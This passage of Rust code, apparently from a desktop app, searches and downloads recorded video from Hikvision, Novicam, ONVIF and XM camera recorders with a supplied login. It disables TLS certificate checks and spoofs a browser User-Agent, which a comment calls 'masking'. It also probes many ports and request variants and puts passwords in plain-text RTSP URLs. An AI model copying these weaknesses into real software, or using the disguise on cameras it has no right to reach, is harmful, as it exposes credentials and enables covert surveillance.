    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(true)
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36") // <-- МАСКИРОВКА
        .build()
        .map_err(|e| e.to_string())?;

    let candidates = vec![
        format!("http://{}:80/onvif/device_service", clean_host),
        format!("http://{}:8080/onvif/device_service", clean_host),
        format!("https://{}:443/onvif/device_service", clean_host),
        format!("https://{}:8443/onvif/device_service", clean_host),
    ];

    let soap = r#"<?xml version="1.0" encoding="UTF-8"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <s:Body>
    <tds:GetDeviceInformation/>
  </s:Body>
</s:Envelope>"#;

    push_runtime_log(
        &log_state,
        format!("ONVIF device info fetch started for {}", clean_host),
    );

    for endpoint in candidates {
        let resp = client
            .post(&endpoint)
            .header("Content-Type", "application/soap+xml; charset=utf-8")
            .basic_auth(login.clone(), Some(pass.clone()))
            .body(soap.to_string())
            .send()
            .await;

        match resp {
            Ok(r) => {
                let status_code = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status_code == 200 || status_code == 401 {
                    let preview = text.chars().take(600).collect::<String>();
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ONVIF device info response {} from {}",
                            status_code, endpoint
                        ),
                    );
                    return Ok(NvrDeviceInfoResult {
                        endpoint,
                        status: status_code.to_string(),
                        body_preview: preview,
                    });
                }
            }
            Err(_) => {}
        }
    }

    push_runtime_log(
        &log_state,
        format!("ONVIF device info unavailable for {}", clean_host),
    );

    Err("ONVIF device_service недоступен или не поддерживает GetDeviceInformation".into())
}

fn isapi_reference_search_request_xml(from: &str, to: &str, track_id: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription version="1.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">
  <searchID>1</searchID>
  <trackList>
    <trackID>{track_id}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{from}</startTime>
      <endTime>{to}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</CMSearchDescription>"#
    )
}

fn isapi_diagnostics_request_template(
    host: &str,
    endpoint: &str,
    reason: &str,
    from: &str,
    to: &str,
    track_id: &str,
) -> String {
    let reference_xml = isapi_reference_search_request_xml(from, to, track_id);
    let reason_compact = reason
        .replace('\n', " ")
        .replace('\r', " ")
        .chars()
        .take(220)
        .collect::<String>();

    format!(
        "DIAG_REQUEST host={host} endpoint={endpoint} reason={reason_compact}; приложите модель/прошивку NVR, полный XML ответа ResponseStatus, рабочий запрос из web UI (HAR/DevTools), timezone устройства, channel/stream и временной диапазон. NEXT=invoke('extract_isapi_search_template_from_har', {{ harJson, host }}). REF_REQUEST(method=POST, content-type=application/xml; charset=UTF-8, body={reference_xml})"
    )
}

#[tauri::command]
async fn extract_isapi_search_template_from_har(
    har_json: String,
    host: Option<String>,
    log_state: State<'_, LogState>,
) -> Result<IsapiHarTemplateResult, String> {
    let parsed: Value = serde_json::from_str(&har_json).map_err(|e| e.to_string())?;
    let entries = parsed
        .get("log")
        .and_then(|v| v.get("entries"))
        .and_then(|v| v.as_array())
        .ok_or_else(|| "HAR не содержит log.entries".to_string())?;

    let host_filter = host
        .as_deref()
        .map(normalize_host_for_scan)
        .filter(|h| !h.is_empty());

    let rx = |pat: &str| Regex::new(pat).ok();
    let re_search_id = rx(r"<searchID>([^<]+)</searchID>");
    let re_track_id = rx(r"<trackID>([^<]+)</trackID>");
    let re_start = rx(r"<startTime>([^<]+)</startTime>");
    let re_end = rx(r"<endTime>([^<]+)</endTime>");

    for entry in entries.iter().rev() {
        let req = match entry.get("request") {
            Some(v) => v,
            None => continue,
        };

        let method = req
            .get("method")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string();
        if method.to_uppercase() != "POST" {
            continue;
        }

        let url = req
            .get("url")
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string();
        if !url.contains("/ISAPI/ContentMgmt/search") {
            continue;
        }

        if let Some(hf) = &host_filter {
            if !url.contains(hf) {
                continue;
            }
        }

        let content_type = req
            .get("headers")
            .and_then(|v| v.as_array())
            .and_then(|headers| {
                headers.iter().find_map(|h| {
                    let name = h.get("name")?.as_str()?.to_ascii_lowercase();
                    if name == "content-type" {
                        h.get("value")?.as_str().map(|v| v.to_string())
                    } else {
                        None
                    }
                })
            });

        let request_body = req
            .get("postData")
            .and_then(|v| v.get("text"))
            .and_then(|v| v.as_str())
            .unwrap_or_default()
            .to_string();

        if request_body.trim().is_empty() {
            continue;
        }

        let extract_from_body = |body: &str, re: &Option<Regex>| {
            re.as_ref().and_then(|r| {
                r.captures(body)
                    .and_then(|c| c.get(1).map(|m| m.as_str().trim().to_string()))
            })
        };

        let search_id = extract_from_body(&request_body, &re_search_id);
        let track_id = extract_from_body(&request_body, &re_track_id);
        let start_time = extract_from_body(&request_body, &re_start);
        let end_time = extract_from_body(&request_body, &re_end);

        let result = IsapiHarTemplateResult {
            endpoint: url.clone(),
            method,
            content_type,
            request_body,
            search_id,
            track_id,
            start_time,
            end_time,
        };

        push_runtime_log(
            &log_state,
            format!(
                "ISAPI HAR template extracted: endpoint={} track={:?} [{} - {}]",
                result.endpoint,
                result.track_id,
                result.start_time.clone().unwrap_or_default(),
                result.end_time.clone().unwrap_or_default()
            ),
        );

        return Ok(result);
    }

    Err("Не найден POST /ISAPI/ContentMgmt/search в HAR (с body)".into())
}

#[tauri::command]
async fn search_isapi_recordings(
    host: String,
    login: String,
    pass: String,
    from_time: Option<String>,
    to_time: Option<String>,
    camera_channel_id: Option<u32>,
    stream_type: Option<u32>,
    log_state: State<'_, LogState>,
) -> Result<Vec<IsapiRecordingItem>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ISAPI search".into());
    }

    let from = from_time.unwrap_or_else(|| "2026-01-01T00:00:00Z".into());
    let to = to_time.unwrap_or_else(|| "2026-12-31T23:59:59Z".into());
    let run_id = Utc::now().timestamp_millis();

    let preferred_endpoint = format!("http://{}:2019/ISAPI/ContentMgmt/search", clean_host);
    let fallback_endpoints = vec![
        format!("http://{}:80/ISAPI/ContentMgmt/search", clean_host),
        format!("http://{}:8080/ISAPI/ContentMgmt/search", clean_host),
        format!("https://{}:443/ISAPI/ContentMgmt/search", clean_host),
        format!("https://{}:8443/ISAPI/ContentMgmt/search", clean_host),
    ];
    let mut candidates = vec![preferred_endpoint.clone()];
    candidates.extend(fallback_endpoints);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(15))
        .danger_accept_invalid_certs(true)
        .cookie_store(true)
        .build()
        .map_err(|e| e.to_string())?;

    push_runtime_log(
        &log_state,
        format!(
            "ISAPI search[{run_id}] started for {} [{} - {}]",
            clean_host, from, to
        ),
    );

    // Novicam/Hikvision: прогреваем WebSession cookie перед перебором XML-вариантов поиска.
    let _ = client
        .get(format!(
            "http://{}:2019/ISAPI/System/deviceInfo",
            clean_host
        ))
        .header("X-Requested-With", "XMLHttpRequest")
        .header(
            "User-Agent",
            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
        )
        .send()
        .await;

    let start_re = Regex::new(r"<startTime>([^<]+)</startTime>").map_err(|e| e.to_string())?;
    let end_re = Regex::new(r"<endTime>([^<]+)</endTime>").map_err(|e| e.to_string())?;
    let track_re = Regex::new(r"<trackID>([^<]+)</trackID>").map_err(|e| e.to_string())?;
    let playback_uri_re =
        Regex::new(r"<playbackURI>([^<]+)</playbackURI>").map_err(|e| e.to_string())?;
    let url_re = Regex::new(r"<url>([^<]+)</url>").map_err(|e| e.to_string())?;
    let status_code_re =
        Regex::new(r"<statusCode>([^<]+)</statusCode>").map_err(|e| e.to_string())?;
    let status_string_re =
        Regex::new(r"<statusString>([^<]+)</statusString>").map_err(|e| e.to_string())?;
    let lock_status_re =
        Regex::new(r"<lockStatus>([^<]+)</lockStatus>").map_err(|e| e.to_string())?;
    let unlock_time_re =
        Regex::new(r"<unlockTime>([^<]+)</unlockTime>").map_err(|e| e.to_string())?;

    let mut track_ids: Vec<String> = Vec::new();
    if let Some(channel_id) = camera_channel_id {
        let stream = stream_type.unwrap_or(1);
        track_ids.push((channel_id.saturating_mul(100).saturating_add(stream)).to_string());
        track_ids.push(channel_id.to_string());
    }
    track_ids.extend(["101", "1", "100", "0"].iter().map(|v| v.to_string()));
    let mut seen = HashSet::new();
    track_ids.retain(|tid| seen.insert(tid.clone()));

    let body_preview = |text: &str| {
        text.chars()
            .take(220)
            .collect::<String>()
            .replace('\n', " ")
            .replace('\r', " ")
    };

    for endpoint in candidates {
        let is_2019 = endpoint.contains(":2019");
        let mut endpoint_reachable = false;
        let mut endpoint_client_error = false;
        let mut endpoint_last_error: Option<String> = None;

        for tid in &track_ids {
            let xml_variants = vec![
                (
                    "CMSearchDescription-webui-form",
                    format!(
                        r#"<?xml version="1.0" encoding="utf-8"?><CMSearchDescription><searchID>CB934AB2-2AA0-0001-566E-A50063501778</searchID><trackList><trackID>{}</trackID></trackList><timeSpanList><timeSpan><startTime>{}</startTime><endTime>{}</endTime></timeSpan></timeSpanList><maxResults>50</maxResults><searchResultPostion>0</searchResultPostion><metadataList><metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor></metadataList></CMSearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "CMSearchDescription-legacy-postion",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription>
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</CMSearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "CMSearchDescription-position",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription>
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPosition>0</searchResultPosition>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</CMSearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "CMSearchDescription-xmlns",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription version="1.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</CMSearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "CMSearchDescription-xmlns-min",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription version="1.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
</CMSearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "CMSearchDescription-flat-track",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<CMSearchDescription version="1.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">
  <searchID>1</searchID>
  <trackID>{}</trackID>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
</CMSearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "SearchDescription-xmlns",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription version="1.0" xmlns="http://www.hikvision.com/ver20/XMLSchema">
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPostion>0</searchResultPostion>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</SearchDescription>"#,
                        tid, from, to
                    ),
                ),
                (
                    "SearchDescription",
                    format!(
                        r#"<?xml version="1.0" encoding="UTF-8"?>
<SearchDescription>
  <searchID>1</searchID>
  <trackList>
    <trackID>{}</trackID>
  </trackList>
  <timeSpanList>
    <timeSpan>
      <startTime>{}</startTime>
      <endTime>{}</endTime>
    </timeSpan>
  </timeSpanList>
  <maxResults>40</maxResults>
  <searchResultPosition>0</searchResultPosition>
  <metadataList>
    <metadataDescriptor>//recordType.meta.std-cgi.com</metadataDescriptor>
  </metadataList>
</SearchDescription>"#,
                        tid, from, to
                    ),
                ),
            ];
            for (variant_name, body) in &xml_variants {
                for content_type in [
                    "application/x-www-form-urlencoded; charset=UTF-8",
                    "application/xml; charset=UTF-8",
                    "text/xml; charset=UTF-8",
                ] {
                    push_runtime_log(
                        &log_state,
                        format!(
                            "ISAPI search[{run_id}] try: endpoint={} tid={} variant={} content-type={}",
                            endpoint, tid, variant_name, content_type
                        ),
                    );

                    let text = if is_2019 {
                        let boot = client
                        .post(&endpoint)
                        .header("Content-Type", content_type)
                        .header("X-Requested-With", "XMLHttpRequest")
                        .header(
                            "User-Agent",
                            "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
                        )
                        .header("Accept", "*/*")
                        .header("Origin", format!("http://{}:2019", clean_host))
                        .header(
                            "Referer",
                            format!(
                                "http://{}:2019/doc/page/download.asp?fileType=record&date={}"
                                , clean_host, from.split('T').next().unwrap_or(""),
                            ),
                        )
                        .body(body.clone())
                        .send()
                        .await;

                        match boot {
                            Ok(r) if r.status().as_u16() == 401 => {
                                let www_auth = r
                                    .headers()
                                    .get(reqwest::header::WWW_AUTHENTICATE)
                                    .and_then(|h| h.to_str().ok())
                                    .map(|s| s.to_string());
                                let _ = r.text().await;

                                if let Some(ah) = www_auth {
                                    let path = "/ISAPI/ContentMgmt/search";
                                    if let Ok(mut prompt) = digest_auth::parse(&ah) {
                                        let mut ctx = digest_auth::AuthContext::new(
                                            login.clone(),
                                            pass.clone(),
                                            path,
                                        );
                                        ctx.method = digest_auth::HttpMethod::POST;

                                        if let Ok(answer) = prompt.respond(&ctx) {
                                            let resp2 = client
                                            .post(&endpoint)
                                            .header("Authorization", answer.to_string())
                                            .header("Content-Type", content_type)
                                            .header("X-Requested-With", "XMLHttpRequest")
                                            .header(
                                                "User-Agent",
                                                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)",
                                            )
                                            .header("Accept", "*/*")
                                            .header("Origin", format!("http://{}:2019", clean_host))
                                            .header(
                                                "Referer",
                                                format!(
                                                    "http://{}:2019/doc/page/download.asp?fileType=record&date={}",
                                                    clean_host,
                                                    from.split('T').next().unwrap_or(""),
                                                ),
                                            )
                                            .body(body.clone())
                                            .send()
                                            .await;

                                            match resp2 {
                                                Ok(r2) => {
                                                    let code = r2.status().as_u16();
                                                    let t = r2.text().await.unwrap_or_default();
                                                    endpoint_reachable = true;
                                                    if code >= 400 {
                                                        endpoint_client_error = true;
                                                        let parsed_status_code = status_code_re
                                                            .captures(&t)
                                                            .and_then(|c| {
                                                                c.get(1).map(|m| {
                                                                    m.as_str().trim().to_string()
                                                                })
                                                            });
                                                        let parsed_status_string = status_string_re
                                                            .captures(&t)
                                                            .and_then(|c| {
                                                                c.get(1).map(|m| {
                                                                    m.as_str().trim().to_string()
                                                                })
                                                            });

                                                        let parsed_lock_status = lock_status_re
                                                            .captures(&t)
                                                            .and_then(|c| {
                                                                c.get(1).map(|m| {
                                                                    m.as_str().trim().to_string()
                                                                })
                                                            });
                                                        let parsed_unlock_time = unlock_time_re
                                                            .captures(&t)
                                                            .and_then(|c| {
                                                                c.get(1).map(|m| {
                                                                    m.as_str().trim().to_string()
                                                                })
                                                            });
                                                        endpoint_last_error = Some(format!(
                                                            "HTTP {} statusCode={:?} statusString={:?} lockStatus={:?} unlockTime={:?} body='{}'",
                                                            code,
                                                            parsed_status_code,
                                                            parsed_status_string,
                                                            parsed_lock_status,
                                                            parsed_unlock_time,
                                                            body_preview(&t)
                                                        ));
                                                    }
                                                    push_runtime_log(
                                                    &log_state,
                                                    format!(
                                                        "ISAPI search[{run_id}] Digest :2019 variant={} tid={} content-type={} → HTTP {} ({} chars) preview='{}'",
                                                        variant_name, tid, content_type, code, t.len(), body_preview(&t)
                                                    ),
                                                );
                                                    if code == 200 {
                                                        Some(t)
                                                    } else {
                                                        None
                                                    }
                                                }
                                                Err(e) => {
                                                    push_runtime_log(
                                                    &log_state,
                                                    format!(
                                                        "ISAPI search[{run_id}] Digest error variant={} tid={} content-type={}: {}",
                                                        variant_name, tid, content_type, e
                                                    ),
                                                );
                                                    None
                                                }
                                            }
                                        } else {
                                            None
                                        }
                                    } else {
                                        None
                                    }
                                } else {
                                    None
                                }
                            }
                            Ok(r) if r.status().is_success() => {
                                endpoint_reachable = true;
                                let t = r.text().await.unwrap_or_default();
                                Some(t)
                            }
                            Ok(r) => {
                                endpoint_reachable = true;
                                let code = r.status().as_u16();
                                let t = r.text().await.unwrap_or_default();
                                if code >= 400 {
                                    endpoint_client_error = true;
                                    let parsed_status_code =
                                        status_code_re.captures(&t).and_then(|c| {
                                            c.get(1).map(|m| m.as_str().trim().to_string())
                                        });
                                    let parsed_status_string =
                                        status_string_re.captures(&t).and_then(|c| {
                                            c.get(1).map(|m| m.as_str().trim().to_string())
                                        });

                                    endpoint_last_error = Some(format!(
                                        "HTTP {} statusCode={:?} statusString={:?} body='{}'",
                                        code,
                                        parsed_status_code,
                                        parsed_status_string,
                                        body_preview(&t)
                                    ));
                                }
                                push_runtime_log(
                                &log_state,
                                format!(
                                    "ISAPI search[{run_id}] :2019 variant={} tid={} content-type={} → HTTP {} ({} chars) preview='{}'",
                                    variant_name,
                                    tid,
                                    content_type,
                                    code,
                                    t.len(),
                                    body_preview(&t)
                                ),
                            );
                                None
                            }
                            Err(e) => {
                                push_runtime_log(
                                &log_state,
                                format!(
                                    "ISAPI search[{run_id}] :2019 error variant={} tid={} content-type={}: {}",
                                    variant_name, tid, content_type, e
                                ),
                            );
                                None
                            }
                        }
                    } else {
                        let resp = client
                            .post(&endpoint)
                            .header("Content-Type", content_type)
                            .basic_auth(login.clone(), Some(pass.clone()))
                            .body(body.clone())
                            .send()
                            .await;

                        match resp {
                            Ok(r) => {
                                let code = r.status().as_u16();
                                let t = r.text().await.unwrap_or_default();
                                push_runtime_log(
                                &log_state,
                                format!(
                                    "ISAPI search[{run_id}] standard port variant={} tid={} content-type={} → HTTP {} ({} chars) preview='{}'",
                                    variant_name, tid, content_type, code, t.len(), body_preview(&t)
                                ),
                            );
                                if code == 200 {
                                    Some(t)
                                } else {
                                    None
                                }
                            }
                            Err(e) => {
                                push_runtime_log(
                                &log_state,
                                format!(
                                    "ISAPI search[{run_id}] standard port error variant={} tid={} content-type={}: {}",
                                    variant_name, tid, content_type, e
                                ),
                            );
                                None
                            }
                        }
                    };

                    if let Some(text) = text {
                        let starts: Vec<String> = start_re
                            .captures_iter(&text)
                            .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                            .collect();

                        let ends: Vec<String> = end_re
                            .captures_iter(&text)
                            .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                            .collect();

                        let tracks: Vec<String> = track_re
                            .captures_iter(&text)
                            .filter_map(|c| c.get(1).map(|m| m.as_str().to_string()))
                            .collect();

                        let mut uris: Vec<String> = playback_uri_re
                            .captures_iter(&text)
                            .filter_map(|c| {
                                c.get(1)
                                    .map(|m| m.as_str().replace("&amp;", "&").trim().to_string())
                            })
                            .collect();

                        if uris.is_empty() {
                            uris = url_re
                                .captures_iter(&text)
                                .filter_map(|c| {
                                    c.get(1).map(|m| {
                                        m.as_str().replace("&amp;", "&").trim().to_string()
                                    })
                                })
                                .collect();
                        }

                        let count = [starts.len(), ends.len(), tracks.len(), uris.len()]
                            .into_iter()
                            .max()
                            .unwrap_or(0)
                            .min(40);

                        if count == 0 {
                            push_runtime_log(
                            &log_state,
                            format!(
                                "ISAPI search[{run_id}] response accepted, but no items parsed: endpoint={} tid={} variant={}",
                                endpoint, tid, variant_name
                            ),
                        );
                            continue;
                        }

                        let mut items = Vec::with_capacity(count);
                        for i in 0..count {
                            // 🔥 БОЛЬШЕ НИКАКИХ ПОДМЕН ВРЕМЕНИ! БЕРЕМ ЧИСТУЮ ПРАВДУ ОТ КАМЕРЫ!
                            let start_time = starts.get(i).cloned();
                            let end_time = ends.get(i).cloned();
                            let mut playback_uri = uris.get(i).cloned();

                            // 🔥 МАГИЯ: Если Novicam (или Hikvision) выдает внутренний IP (192.168.x.x),
                            // мы насильно заменяем его на внешний IP-адрес, к которому мы подключились!
                            if let Some(ref mut uri) = playback_uri {
                                if let Ok(parsed_endpoint) = reqwest::Url::parse(&endpoint) {
                                    if let Some(target_host) = parsed_endpoint.host_str() {
                                        if let Ok(mut parsed_uri) = reqwest::Url::parse(uri) {
                                            let _ = parsed_uri.set_host(Some(target_host));
                                            *uri = parsed_uri.to_string();
                                        }
                                    }
                                }
                            }

                            let (transport, downloadable, playable, confidence) =
                                classify_isapi_record(
                                    playback_uri.as_deref(),
                                    start_time.as_deref(),
                                    end_time.as_deref(),
                                );

                            items.push(IsapiRecordingItem {
                                endpoint: endpoint.clone(),
                                track_id: tracks.get(i).cloned().or_else(|| Some(tid.to_string())),
                                start_time,
                                end_time,
                                playback_uri,
                                transport,
                                downloadable,
                                playable,
                                confidence,
                            });
                        }

                        if items.is_empty() {
                            continue;
                        }

                        let downloadable_count = items.iter().filter(|x| x.downloadable).count();
                        let playable_count = items.iter().filter(|x| x.playable).count();
                        let max_confidence = items.iter().map(|x| x.confidence).max().unwrap_or(0);

                        push_runtime_log(
                        &log_state,
                        format!(
                            "ISAPI search[{run_id}] finished for {} via {} | tid={} | variant={} | items={} | playable={} | downloadable={} | max_conf={}",
                            clean_host,
                            endpoint,
                            tid,
                            variant_name,
                            items.len(),
                            playable_count,
                            downloadable_count,
                            max_confidence
                        ),
                    );

                        return Ok(items);
                    }
                }
            }
        }

        if is_2019 && endpoint_reachable && endpoint_client_error {
            let reason = endpoint_last_error.unwrap_or_else(|| {
                "Устройство вернуло client-error на 2019 порту для всех проверенных ISAPI-шаблонов"
                    .to_string()
            });
            push_runtime_log(
                &log_state,
                format!(
                    "ISAPI search[{run_id}]: порт 2019 доступен, но запросы отклоняются. Перехожу к fallback-портам. {}",
                    reason
                ),
            );
            continue;
        }
    }

    push_runtime_log(
        &log_state,
        format!("ISAPI search[{run_id}] unavailable for {}", clean_host),
    );
    let diag_request = isapi_diagnostics_request_template(
        &clean_host,
        &preferred_endpoint,
        "no_successful_search_response",
        &from,
        &to,
        track_ids.first().map(String::as_str).unwrap_or("101"),
    );
    push_runtime_log(
        &log_state,
        format!(
            "ISAPI search[{run_id}] diagnostics request: {}",
            diag_request
        ),
    );
    Err(format!(
        "ISAPI ContentMgmt/search недоступен или вернул неподдерживаемый ответ. {}",
        diag_request
    ))
}

#[tauri::command]
async fn search_xm_recordings(
    host: String,
    login: String,
    pass: String,
    channel: Option<u32>,
    from_time: Option<String>,
    to_time: Option<String>,
) -> Result<Vec<XmRecordingItem>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для XM search".into());
    }

    let from = from_time.unwrap_or_else(|| "2026-01-01T00:00:00Z".into());
    let to = to_time.unwrap_or_else(|| "2026-12-31T23:59:59Z".into());
    let channel_id = channel.unwrap_or(1);

    let files = nexus::search_xm_recordings(
        clean_host.clone(),
        login.clone(),
        pass.clone(),
        channel_id,
        from.clone(),
        to.clone(),
    )
    .await?;

    let mut out = Vec::with_capacity(files.len());
    for filename in files {
        let playback_uri = format!(
            "rtsp://{}:{}@{}:554/mode=file&type=rec&filename={}",
            urlencoding::encode(&login),
            urlencoding::encode(&pass),
            clean_host,
            urlencoding::encode(&filename)
        );
        out.push(XmRecordingItem {
            start_time: from.clone(),
            end_time: to.clone(),
            playback_uri,
            label: filename,
        });
    }

    Ok(out)
}

#[tauri::command]
async fn download_xm_archive(
    playback_uri: String,
    filename_hint: Option<String>,
    task_id: Option<String>,
    log_state: State<'_, LogState>,
    cancel_state: State<'_, DownloadCancelState>,
    ffmpeg_limiter: State<'_, FfmpegLimiterState>,
) -> Result<DownloadReport, String> {
    if playback_uri.trim().is_empty() {
        return Err("Пустой playback_uri для XM".into());
    }

    let task_key =
        task_id.unwrap_or_else(|| format!("xm_export_{}", Utc::now().timestamp_millis()));
    if let Ok(mut cancelled) = cancel_state.cancelled_tasks.lock() {
        cancelled.remove(&task_key);
    }

    push_runtime_log(
        &log_state,
        format!("XM_ARCHIVE_EXPORT|{}|status=started", task_key),
    );

    // Занимаем слот FFmpeg (чтобы не заспамить систему, если качаем 10 файлов сразу)
    let permit = ffmpeg_limiter
        .semaphore
        .clone()
        .acquire_owned()
        .await
        .map_err(|e| format!("Не удалось занять слот FFmpeg: {}", e))?;

    let mut filename = filename_hint
        .map(|s| sanitize_filename_component(&s))
        .filter(|s| !s.is_empty())
        .unwrap_or_else(|| format!("tantos_record_{}.mp4", Utc::now().format("%Y%m%d_%H%M%S")));
    if !filename.contains('.') {
        filename.push_str(".mp4");
    }

    let path = get_vault_path()
        .join("archives")
        .join("tantos")
        .join(&filename);
    let _ = std::fs::create_dir_all(path.parent().unwrap());
    let output_path = path.to_string_lossy().to_string();

    let started = std::time::Instant::now();

    // Запускаем дамп RTSP-потока.
    // ВАЖНО: Никакого ограничения по времени (-t), качаем пока камера не отдаст EOF
    let mut child = tokio::process::Command::new("ffmpeg")
        .args([
            "-y",
            "-rtsp_transport",
            "tcp",
            "-timeout",
            "10000000", // Защита от зависаний (10 сек)
            "-i",
            &playback_uri,
            "-c",
            "copy", // Сквозной проброс без перекодирования (0% CPU)
            &output_path,
        ])
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .spawn()
        .map_err(|e| format!("Не удалось запустить FFmpeg для дампа: {}", e))?;

    let mut last_size: u64 = 0;
    let mut last_progress = std::time::Instant::now();

    loop {
        // 1. Проверка на отмену пользователем
        if cancel_state
            .cancelled_tasks
            .lock()
            .map(|s| s.contains(&task_key))
            .unwrap_or(false)
        {
            let _ = child.start_kill();
            let _ = std::fs::remove_file(&path);
            drop(permit);
            push_runtime_log(
                &log_state,
                format!("DOWNLOAD_CANCELLED|{}|{}", task_key, filename),
            );
            return Err("Загрузка отменена".into());
        }

        // 2. Проверка: завершил ли FFmpeg скачивание (камера прислала EOF)
        match child.try_wait() {
            Ok(Some(status)) => {
                if !status.success() {
                    drop(permit);
                    return Err(format!("Сбой скачивания архива Tantos: {}", status));
                }
                break; // Успешно скачали!
            }
            Ok(None) => {} // Ещё качается
            Err(e) => {
                drop(permit);
                return Err(format!("Ошибка процесса FFmpeg: {}", e));
            }
        }

        // 3. Отправляем прогресс в UI каждые 2 секунды
        if last_progress.elapsed() >= std::time::Duration::from_secs(2) {
            let current_size = std::fs::metadata(&path)
                .map(|m| m.len())
                .unwrap_or(last_size);
            if current_size > last_size {
                // Выводим размер, так как точный % узнать у RTSP нельзя
                push_runtime_log(
                    &log_state,
                    format!("DOWNLOAD_PROGRESS|{}|{}|0", task_key, current_size),
                );
                last_size = current_size;
            }
            last_progress = std::time::Instant::now();
        }

        // 4. Глобальный таймаут (2 часа максимум на один файл, чтобы не висел вечно)
        if started.elapsed() > std::time::Duration::from_secs(7200) {
            let _ = child.start_kill();
            drop(permit);
            return Err("Таймаут скачивания архива Tantos (2 часа)".into());
        }

        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }

    let bytes_written = std::fs::metadata(&path).map(|m| m.len()).unwrap_or(0);
    drop(permit);

    push_runtime_log(
        &log_state,
        format!(
            "XM_ARCHIVE_EXPORT|{}|status=done|bytes={}",
            task_key, bytes_written
        ),
    );

    Ok(DownloadReport {
        server_alias: "tantos_rtsp".into(),
        filename,
        save_path: output_path,
        bytes_written,
        total_bytes: bytes_written,
        duration_ms: started.elapsed().as_millis(),
        resumed: false,
        skipped_as_complete: false,
    })
}

#[tauri::command]
async fn search_onvif_recordings(
    host: String,
    login: String,
    pass: String,
    log_state: State<'_, LogState>,
) -> Result<Vec<OnvifRecordingItem>, String> {
    let clean_host = normalize_host_for_scan(&host);
    if clean_host.is_empty() {
        return Err("Пустой host для ONVIF recordings search".into());
    }

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    let endpoints = vec![
